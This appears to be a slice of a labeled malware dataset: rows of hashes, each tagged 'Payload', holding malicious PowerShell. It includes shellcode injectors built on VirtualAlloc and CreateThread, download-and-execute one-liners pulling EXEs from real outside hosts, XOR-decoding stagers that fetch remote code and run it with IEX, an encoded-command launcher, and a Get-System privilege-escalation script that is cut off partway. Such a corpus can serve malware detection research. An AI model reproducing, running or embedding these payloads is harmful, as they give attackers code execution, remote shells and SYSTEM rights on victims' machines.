$ktC = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ktC -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xa9,0x56,0xcc,0x50,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x53,0x83,0xc3,0x04,0x31,0x43,0x0e,0x03,0xea,0x58,0x2e,0xa5,0x10,0x8c,0x2c,0x46,0xe8,0x4d,0x51,0xce,0x0d,0x7c,0x51,0xb4,0x46,0x2f,0x61,0xbe,0x0a,0xdc,0x0a,0x92,0xbe,0x57,0x7e,0x3b,0xb1,0xd0,0x35,0x1d,0xfc,0xe1,0x66,0x5d,0x9f,0x61,0x75,0xb2,0x7f,0x5b,0xb6,0xc7,0x7e,0x9c,0xab,0x2a,0xd2,0x75,0xa7,0x99,0xc2,0xf2,0xfd,0x21,0x69,0x48,0x13,0x22,0x8e,0x19,0x12,0x03,0x01,0x11,0x4d,0x83,0xa0,0xf6,0xe5,0x8a,0xba,0x1b,0xc3,0x45,0x31,0xef,0xbf,0x57,0x93,0x21,0x3f,0xfb,0xda,0x8d,0xb2,0x05,0x1b,0x29,0x2d,0x70,0x55,0x49,0xd0,0x83,0xa2,0x33,0x0e,0x01,0x30,0x93,0xc5,0xb1,0x9c,0x25,0x09,0x27,0x57,0x29,0xe6,0x23,0x3f,0x2e,0xf9,0xe0,0x34,0x4a,0x72,0x07,0x9a,0xda,0xc0,0x2c,0x3e,0x86,0x93,0x4d,0x67,0x62,0x75,0x71,0x77,0xcd,0x2a,0xd7,0xfc,0xe0,0x3f,0x6a,0x5f,0x6d,0xf3,0x47,0x5f,0x6d,0x9b,0xd0,0x2c,0x5f,0x04,0x4b,0xba,0xd3,0xcd,0x55,0x3d,0x13,0xe4,0x22,0xd1,0xea,0x07,0x53,0xf8,0x28,0x53,0x03,0x92,0x99,0xdc,0xc8,0x62,0x25,0x09,0x64,0x6a,0x80,0xe2,0x9b,0x97,0x72,0x53,0x1c,0x37,0x1b,0xb9,0x93,0x68,0x3b,0xc2,0x79,0x01,0xd4,0x3f,0x82,0x32,0xb4,0xc9,0x64,0x26,0xa6,0x9f,0x3f,0xde,0x04,0xc4,0xf7,0x79,0x76,0x2e,0xa0,0xed,0x3f,0x38,0x77,0x12,0xc0,0x6e,0xdf,0x84,0x4b,0x7d,0xdb,0xb5,0x4b,0xa8,0x4b,0xa2,0xdc,0x26,0x1a,0x81,0x7d,0x36,0x37,0x71,0x1d,0xa5,0xdc,0x81,0x68,0xd6,0x4a,0xd6,0x3d,0x28,0x83,0xb2,0xd3,0x13,0x3d,0xa0,0x29,0xc5,0x06,0x60,0xf6,0x36,0x88,0x69,0x7b,0x02,0xae,0x79,0x45,0x8b,0xea,0x2d,0x19,0xda,0xa4,0x9b,0xdf,0xb4,0x06,0x75,0xb6,0x6b,0xc1,0x11,0x4f,0x40,0xd2,0x67,0x50,0x8d,0xa4,0x87,0xe1,0x78,0xf1,0xb8,0xce,0xec,0xf5,0xc1,0x32,0x8d,0xfa,0x18,0xf7,0xbd,0xb0,0x00,0x5e,0x56,0x1d,0xd1,0xe2,0x3b,0x9e,0x0c,0x20,0x42,0x1d,0xa4,0xd9,0xb1,0x3d,0xcd,0xdc,0xfe,0xf9,0x3e,0xad,0x6f,0x6c,0x40,0x02,0x8f,0xa5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Lbv5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Lbv5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Lbv5,0,0,0);for (;;){Start-sleep 60};

",Payload
30a5d1443d7e3e1e4f15af2900ccf25d5631d5475f52a33c93df91076a0e8264,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vhcwbo.exe',""$env:TEMP\\winrex.exe"");Start-Process (""$env:TEMP\\winrex.exe"")

",Payload
4fc676e10c76d22f89c74c994760ab21044c1182366a0a5473b110d631cad6e6,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/abuchi.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
b19c8563cc4bc8cc1d3d51aaf18dedfad5a8be81c4137c3a9612e81c9a406f80,"
[System.NET.SERVICePOiNtManageR]::EXPeCt100ContInUe = 0;$wc=NEW-OBJECt SyStem.NEt.WEBClIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdErS.ADD('User-Agent',$u);$wC.Proxy = [SySTeM.NEt.WebREQuEsT]::DEFAuLtWebPROxy;$wc.PRoXY.CrEdeNTIAlS = [SYsTEm.NeT.CREdEnTIalCaChE]::DefaULtNeTWoRKCREDeNTIAlS;$K='!N._jhY+G}P$|[gVlmHJRL,85WA&zdUQ';$i=0;[CHar[]]$b=([ChaR[]]($WC.DOWNloadSTriNg(""http://185.117.72.45:8080/index.asp"")))|%{$_-bXOR$k[$I++%$K.LeNgth]};IEX ($b-jOiN'')

",Payload
714948928a5ef7604b1deabcf81f08a270d03679bae61e77a1230b7520ab086c,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc4,0xea,0xac,0xc3,0xdb,0xdc,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x0f,0x03,0x46,0xcb,0x08,0x59,0x3f,0x3b,0x4e,0xa2,0xc0,0xbb,0x2f,0x2a,0x25,0x8a,0x6f,0x48,0x2d,0xbc,0x5f,0x1a,0x63,0x30,0x2b,0x4e,0x90,0xc3,0x59,0x47,0x97,0x64,0xd7,0xb1,0x96,0x75,0x44,0x81,0xb9,0xf5,0x97,0xd6,0x19,0xc4,0x57,0x2b,0x5b,0x01,0x85,0xc6,0x09,0xda,0xc1,0x75,0xbe,0x6f,0x9f,0x45,0x35,0x23,0x31,0xce,0xaa,0xf3,0x30,0xff,0x7c,0x88,0x6a,0xdf,0x7f,0x5d,0x07,0x56,0x98,0x82,0x22,0x20,0x13,0x70,0xd8,0xb3,0xf5,0x49,0x21,0x1f,0x38,0x66,0xd0,0x61,0x7c,0x40,0x0b,0x14,0x74,0xb3,0xb6,0x2f,0x43,0xce,0x6c,0xa5,0x50,0x68,0xe6,0x1d,0xbd,0x89,0x2b,0xfb,0x36,0x85,0x80,0x8f,0x11,0x89,0x17,0x43,0x2a,0xb5,0x9c,0x62,0xfd,0x3c,0xe6,0x40,0xd9,0x65,0xbc,0xe9,0x78,0xc3,0x13,0x15,0x9a,0xac,0xcc,0xb3,0xd0,0x40,0x18,0xce,0xba,0x0c,0xed,0xe3,0x44,0xcc,0x79,0x73,0x36,0xfe,0x26,0x2f,0xd0,0xb2,0xaf,0xe9,0x27,0xb5,0x85,0x4e,0xb7,0x48,0x26,0xaf,0x91,0x8e,0x72,0xff,0x89,0x27,0xfb,0x94,0x49,0xc8,0x2e,0x3a,0x1a,0x66,0x81,0xfb,0xca,0xc6,0x71,0x94,0x00,0xc9,0xae,0x84,0x2a,0x00,0xc7,0x2f,0xd0,0xc2,0x28,0x07,0xdb,0x11,0xc1,0x5a,0xdc,0x14,0xaa,0xd2,0x3a,0x7c,0xdc,0xb2,0x95,0xe8,0x45,0x9f,0x6e,0x89,0x8a,0x35,0x0b,0x89,0x01,0xba,0xeb,0x47,0xe2,0xb7,0xff,0x3f,0x02,0x82,0xa2,0xe9,0x1d,0x38,0xc8,0x15,0x88,0xc7,0x5b,0x42,0x24,0xca,0xba,0xa4,0xeb,0x35,0xe9,0xbf,0x22,0xa0,0x52,0xd7,0x4a,0x24,0x53,0x27,0x1d,0x2e,0x53,0x4f,0xf9,0x0a,0x00,0x6a,0x06,0x87,0x34,0x27,0x93,0x28,0x6d,0x94,0x34,0x41,0x93,0xc3,0x73,0xce,0x6c,0x26,0x82,0x32,0xbb,0x0e,0xf0,0x5a,0x7f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
5f789d33ad145f39719fe086b8f1cb914f8c4406e74bf824fc89af0727a94ab2,"
$WC=New-OBjeCt SysteM.NeT.WeBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HeADers.Add('User-Agent',$u);$WC.PrOxY = [SYsTem.NeT.WEBREquEsT]::DeFAuLtWEBPROxy;$WC.PrOXY.CrEDEnTIALS = [SYstEm.NeT.CREdenTiALCaCHE]::DefauLTNeTWorkCREdenTiALS;$K='4cb33a00ce89ad59228ea02a42b2679d';$i=0;[cHar[]]$B=([CHaR[]]($WC.DOwnloadStRINg(""https://logexpert.eu/index.asp"")))|%{$_-BXor$k[$I++%$K.LenGtH]};IEX ($B-JOIN'')

",Payload
17986c869474fb98fa38009e9cf3a890a2940911978f7ba190490071210d945d,"
(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\\wincat.exe"");Start-Process (""$env:TEMP\\wincat.exe"")

",Payload
8d19bd90b7d3dc0b4d3a3e3c5ab8af93ff7a5cefdf5b23578f9f3db8444d63ac,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x79,0xcb,0xf3,0xb8,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x76,0x29,0x06,0x44,0x60,0x2f,0xe9,0xb5,0x70,0x50,0x63,0x50,0x41,0x50,0x17,0x10,0xf1,0x60,0x53,0x74,0xfd,0x0b,0x31,0x6d,0x76,0x79,0x9e,0x82,0x3f,0x34,0xf8,0xad,0xc0,0x65,0x38,0xaf,0x42,0x74,0x6d,0x0f,0x7b,0xb7,0x60,0x4e,0xbc,0xaa,0x89,0x02,0x15,0xa0,0x3c,0xb3,0x12,0xfc,0xfc,0x38,0x68,0x10,0x85,0xdd,0x38,0x13,0xa4,0x73,0x33,0x4a,0x66,0x75,0x90,0xe6,0x2f,0x6d,0xf5,0xc3,0xe6,0x06,0xcd,0xb8,0xf8,0xce,0x1c,0x40,0x56,0x2f,0x91,0xb3,0xa6,0x77,0x15,0x2c,0xdd,0x81,0x66,0xd1,0xe6,0x55,0x15,0x0d,0x62,0x4e,0xbd,0xc6,0xd4,0xaa,0x3c,0x0a,0x82,0x39,0x32,0xe7,0xc0,0x66,0x56,0xf6,0x05,0x1d,0x62,0x73,0xa8,0xf2,0xe3,0xc7,0x8f,0xd6,0xa8,0x9c,0xae,0x4f,0x14,0x72,0xce,0x90,0xf7,0x2b,0x6a,0xda,0x15,0x3f,0x07,0x81,0x71,0x8c,0x2a,0x3a,0x81,0x9a,0x3d,0x49,0xb3,0x05,0x96,0xc5,0xff,0xce,0x30,0x11,0x00,0xe5,0x85,0x8d,0xff,0x06,0xf6,0x84,0x3b,0x52,0xa6,0xbe,0xea,0xdb,0x2d,0x3f,0x13,0x0e,0xe1,0x6f,0xbb,0xe1,0x42,0xc0,0x7b,0x52,0x2b,0x0a,0x74,0x8d,0x4b,0x35,0x5f,0xa6,0xe6,0xcf,0x37,0x00,0x06,0x3b,0x3a,0xfa,0xe5,0xc4,0xd5,0xa7,0x60,0x22,0xbf,0x47,0x25,0xfc,0x57,0xf1,0x6c,0x76,0xc6,0xfe,0xba,0xf2,0xc8,0x75,0x49,0x02,0x86,0x7d,0x24,0x10,0x7e,0x8e,0x73,0x4a,0x28,0x91,0xa9,0xe1,0xd4,0x07,0x56,0xa0,0x83,0xbf,0x54,0x95,0xe3,0x1f,0xa6,0xf0,0x78,0xa9,0x32,0xbb,0x16,0xd6,0xd2,0x3b,0xe6,0x80,0xb8,0x3b,0x8e,0x74,0x99,0x6f,0xab,0x7a,0x34,0x1c,0x60,0xef,0xb7,0x75,0xd5,0xb8,0xdf,0x7b,0x00,0x8e,0x7f,0x83,0x67,0x0e,0x43,0x52,0x41,0x64,0xad,0x66;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
568bcac29892897e8bcd5b005898a15b1fbc343d45b4a9431b46b07df9c9050e,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xc5,0x8e,0x68,0x02,0x00,0x9d,0x6b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
6f15446586133c28909d5936b2d2e77f45cff3496992635379d4c9f43d07fb02,"
$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";iex ""& $i8Wb $vEF $e""}else{;iex ""& powershell $vEF $e"";}

",Payload
a722af40014fccd8d065baebaaed6a698ad933ee9443e848f7c635015d1d533f,"function Get-System {

    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]
    param(
        [Parameter(ParameterSetName = ""NamedPipe"")]
        [Parameter(ParameterSetName = ""Token"")]
        [String]
        [ValidateSet(""NamedPipe"", ""Token"")]
        $Technique = 'NamedPipe',

        [Parameter(ParameterSetName = ""NamedPipe"")]
        [String]
        $ServiceName = 'TestSVC',

        [Parameter(ParameterSetName = ""NamedPipe"")]
        [String]
        $PipeName = 'TestSVC',

        [Parameter(ParameterSetName = ""RevToSelf"")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = ""WhoAmI"")]
        [Switch]
        $WhoAmI
    )

    $ErrorActionPreference = ""Stop""

    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    
    
    function Local:Get-SystemNamedPipe {
        param(
            [String]
            $ServiceName = ""TestSVC"",

            [String]
            $PipeName = ""TestSVC""
        )

        $Command = ""%COMSPEC% /C start %COMSPEC% /C `""timeout /t 3 >nul&&echo $PipeName > \\\\.\\pipe\\$PipeName`""""

        Add-Type -Assembly System.Core

        
        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( ""Everyone"", ""ReadWrite"", ""Allow"" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,""InOut"",100, ""Byte"", ""None"", 1024, 1024, $PipeSecurity)

        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()

        
        
        $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
        $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
        $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)

        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)

        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
        
        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
      
        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)

        
        
        
        Write-Verbose ""Opening service manager""
        $ManagerHandle = $OpenSCManagerA.Invoke(""\\\\localhost"", ""ServicesActive"", 0xF003F)
        Write-Verbose ""Service manager handle: $ManagerHandle""

        
        if ($ManagerHandle -and ($ManagerHandle -ne 0)) {

            
            
            
            
            
            Write-Verbose ""Creating new service: '$ServiceName'""
            try {
                $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)
                $err = $GetLastError.Invoke()
            }
            catch {
                Write-Warning ""Error creating service : $_""
                $ServiceHandle = 0
            }
            Write-Verbose ""CreateServiceA Handle: $ServiceHandle""

            if ($ServiceHandle -and ($ServiceHandle -ne 0)) {
                $Success = $True
                Write-Verbose ""Service successfully created""

                
                Write-Verbose ""Closing service handle""
                $Null = $CloseServiceHandle.Invoke($ServiceHandle)

                
                Write-Verbose ""Opening the service '$ServiceName'""
                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)
                Write-Verbose ""OpenServiceA handle: $ServiceHandle""

                if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                    
